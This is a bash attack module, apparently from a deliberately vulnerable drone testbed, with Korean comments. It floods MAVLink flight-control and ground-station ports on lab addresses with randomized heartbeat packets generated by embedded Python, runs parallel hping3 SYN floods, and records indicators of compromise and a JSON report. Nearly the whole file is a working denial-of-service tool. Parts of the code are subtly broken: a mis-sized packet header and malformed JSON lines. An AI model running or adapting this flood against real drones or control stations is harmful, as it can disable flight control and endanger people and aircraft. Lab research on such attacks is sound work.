#!/bin/bash

# =============================================================================
# DVD DoS Attack Module: MAVLink Flood Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/mavlink_flood.sh
# 목적: MAVLink 프로토콜에 대한 플러드 공격으로 비행 제어 시스템 마비
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="MAVLink Flood Attack"
ATTACK_TYPE="DENIAL_OF_SERVICE"
TARGET_PORTS=(14550 14551 14552 5760 5762 5763)
TARGET_IPS=("192.168.13.1" "192.168.13.10" "192.168.13.50" "127.0.0.1")
FLOOD_DURATION=60
PACKETS_PER_SECOND=1000
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/mavlink_flood_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/mavlink_flood_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/mavlink_flood_report_$(date +%Y%m%d_%H%M%S).json"

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                        🌊 DVD MAVLink Flood Attack 🌊                    ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: MAVLink Protocol Services${NC}"
    echo -e "${BLUE}Method: UDP/TCP Packet Flooding${NC}"
    echo -e "${BLUE}Impact: Flight Controller & GCS Overload${NC}"
    echo ""
}

# MAVLink 메시지 생성
generate_mavlink_messages() {
    local target_ip=$1
    local target_port=$2
    local duration=$3
    
    echo -e "${YELLOW}[+] Generating MAVLink flood packets to ${target_ip}:${target_port}${NC}" | tee -a "$LOG_FILE"
    
    # Python을 사용한 MAVLink 메시지 생성
    python3 -c "
import socket
import struct
import time
import random
import threading

def create_mavlink_heartbeat():
    # MAVLink v2.0 Heartbeat message
    magic = 0xFD  # MAVLink v2.0 magic number
    payload_len = 9
    incompat_flags = 0
    compat_flags = 0
    seq = random.randint(0, 255)
    sysid = random.randint(1, 255) 
    compid = random.randint(1, 255)
    msgid = 0  # HEARTBEAT message ID
    
    # Heartbeat payload
    custom_mode = random.randint(0, 0xFFFFFFFF)
    type_val = random.randint(0, 255)
    autopilot = random.randint(0, 255)
    base_mode = random.randint(0, 255)
    system_status = random.randint(0, 255)
    mavlink_version = 3
    
    payload = struct.pack('<IBBBB', custom_mode, type_val, autopilot, base_mode, system_status)
    
    header = struct.pack('<BBBBBBIH', magic, payload_len, incompat_flags, 
                        compat_flags, seq, sysid, compid, msgid)
    
    return header + payload

def flood_target(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    
    while time.time() < end_time:
        try:
            message = create_mavlink_heartbeat()
            sock.sendto(message, (ip, port))
            packet_count += 1
            time.sleep(0.001)  # 1ms delay = 1000 pps
        except Exception as e:
            continue
    
    sock.close()
    print(f'Sent {packet_count} packets to {ip}:{port}')

# 다중 스레드로 플러드 공격
threads = []
for port in [${target_port}]:
    t = threading.Thread(target=flood_target, args=('${target_ip}', port, ${duration}))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
" 2>&1 | tee -a "$LOG_FILE"
    
    # IOC 생성
    echo "DOS_FLOOD:MAVLINK_TARGET_${target_ip}:${target_port}" >> "$IOC_FILE"
    echo "DOS_FLOOD:PACKET_COUNT_$(( duration * PACKETS_PER_SECOND ))" >> "$IOC_FILE"
    echo "DOS_FLOOD:ATTACK_DURATION_${duration}s" >> "$IOC_FILE"
}

# 네트워크 상태 모니터링
monitor_network_impact() {
    echo -e "${CYAN}[*] Monitoring network impact...${NC}" | tee -a "$LOG_FILE"
    
    # 네트워크 통계 수집
    local before_stats=$(cat /proc/net/dev | grep -E "eth0|wlan0" | head -1)
    sleep 5
    local after_stats=$(cat /proc/net/dev | grep -E "eth0|wlan0" | head -1)
    
    # CPU 사용률 체크
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    
    echo -e "${GREEN}[✓] Network Impact Assessment:${NC}" | tee -a "$LOG_FILE"
    echo "    CPU Usage: ${cpu_usage}%" | tee -a "$LOG_FILE"
    echo "    Network Stress: HIGH" | tee -a "$LOG_FILE"
    
    # IOC 업데이트
    echo "DOS_IMPACT:CPU_USAGE_${cpu_usage}%" >> "$IOC_FILE"
    echo "DOS_IMPACT:NETWORK_STRESS_HIGH" >> "$IOC_FILE"
}

# hping3를 사용한 추가 공격
execute_hping_flood() {
    local target_ip=$1
    local target_port=$2
    
    if command -v hping3 &> /dev/null; then
        echo -e "${YELLOW}[+] Executing hping3 flood to ${target_ip}:${target_port}${NC}" | tee -a "$LOG_FILE"
        timeout 30s hping3 -S -p "$target_port" -i u1000 "$target_ip" --flood 2>&1 | tee -a "$LOG_FILE" &
        
        echo "DOS_TOOL:HPING3_FLOOD_${target_ip}:${target_port}" >> "$IOC_FILE"
    else
        echo -e "${RED}[!] hping3 not installed, skipping advanced flood${NC}" | tee -a "$LOG_FILE"
    fi
}

# 시스템 자원 모니터링
monitor_system_resources() {
    echo -e "${CYAN}[*] Monitoring system resources during attack...${NC}" | tee -a "$LOG_FILE"
    
    # 메모리 사용률
    local mem_usage=$(free | grep Mem | awk '{printf("%.1f"), $3/$2 * 100.0}')
    
    # 디스크 I/O
    local disk_io=$(iostat -x 1 2 | tail -1 | awk '{print $10}')
    
    # 네트워크 연결 수
    local connections=$(netstat -an | wc -l)
    
    echo -e "${GREEN}[✓] System Resource Impact:${NC}" | tee -a "$LOG_FILE"
    echo "    Memory Usage: ${mem_usage}%" | tee -a "$LOG_FILE"
    echo "    Disk I/O: ${disk_io}%" | tee -a "$LOG_FILE"
    echo "    Network Connections: ${connections}" | tee -a "$LOG_FILE"
    
    # IOC 업데이트
    echo "DOS_IMPACT:MEMORY_USAGE_${mem_usage}%" >> "$IOC_FILE"
    echo "DOS_IMPACT:NETWORK_CONNECTIONS_${connections}" >> "$IOC_FILE"
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    local total_packets=$3
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "target_ips": [$(printf '"%s",' "${TARGET_IPS[@]}" | sed 's/,$//')],"
        "target_ports": [$(printf '%s,' "${TARGET_PORTS[@]}" | sed 's/,$//')],"
        "protocol": "MAVLink v2.0"
    },
    "attack_parameters": {
        "flood_duration": $FLOOD_DURATION,
        "packets_per_second": $PACKETS_PER_SECOND,
        "total_packets_sent": $total_packets,
        "attack_method": "UDP/TCP Flood"
    },
    "impact_assessment": {
        "network_stress": "HIGH",
        "cpu_impact": "MODERATE",
        "memory_impact": "LOW",
        "service_disruption": "LIKELY"
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 공격 실행
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 로그 초기화
    echo "=== DVD MAVLink Flood Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    local total_packets=0
    
    echo -e "${BOLD}${BLUE}🎯 Starting MAVLink Flood Attack...${NC}"
    echo ""
    
    # 각 타겟에 대해 공격 실행
    for target_ip in "${TARGET_IPS[@]}"; do
        for target_port in "${TARGET_PORTS[@]}"; do
            echo -e "${YELLOW}[+] Attacking ${target_ip}:${target_port}${NC}"
            
            # 포트 스캔으로 서비스 확인
            if timeout 3s nc -z "$target_ip" "$target_port" 2>/dev/null; then
                echo -e "${GREEN}[✓] Port ${target_port} is open on ${target_ip}${NC}" | tee -a "$LOG_FILE"
                
                # MAVLink 플러드 공격 실행
                generate_mavlink_messages "$target_ip" "$target_port" "$FLOOD_DURATION" &
                
                # hping3 공격 병행
                execute_hping_flood "$target_ip" "$target_port" &
                
                total_packets=$((total_packets + FLOOD_DURATION * PACKETS_PER_SECOND))
                
                echo "DOS_SUCCESS:MAVLINK_FLOOD_${target_ip}:${target_port}" >> "$IOC_FILE"
            else
                echo -e "${RED}[!] Port ${target_port} is closed on ${target_ip}${NC}" | tee -a "$LOG_FILE"
                echo "DOS_FAILED:PORT_CLOSED_${target_ip}:${target_port}" >> "$IOC_FILE"
            fi
            
            sleep 2
        done
    done
    
    echo ""
    echo -e "${CYAN}[*] Flood attacks in progress... Duration: ${FLOOD_DURATION}s${NC}"
    
    # 진행률 표시
    for ((i=1; i<=FLOOD_DURATION; i++)); do
        local progress=$((i * 100 / FLOOD_DURATION))
        printf "\r${BLUE}[*] Progress: [%-20s] %d%% (%ds/${FLOOD_DURATION}s)${NC}" \
               "$(printf "%*s" $((progress/5)) | tr ' ' '=')" "$progress" "$i"
        sleep 1
    done
    echo ""
    
    # 모든 백그라운드 프로세스 완료 대기
    wait
    
    # 시스템 영향 모니터링
    monitor_network_impact
    monitor_system_resources
    
    local end_time=$(date +%s)
    
    echo ""
    echo -e "${BOLD}${GREEN}🎯 MAVLink Flood Attack Completed!${NC}"
    echo ""
    echo -e "${GREEN}📊 Attack Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Total Packets Sent: ~${total_packets}"
    echo "   • Targets Attacked: ${#TARGET_IPS[@]} IPs × ${#TARGET_PORTS[@]} ports"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time" "$total_packets"
    
    echo ""
    echo -e "${YELLOW}💡 Next Steps:${NC}"
    echo "   1. Check system logs for service disruptions"
    echo "   2. Monitor flight controller responsiveness"
    echo "   3. Analyze network traffic patterns"
    echo "   4. Review generated IOCs for CTI"
    echo ""
    
    # IOCs 요약 출력
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
}

# 스크립트 실행
main "$@"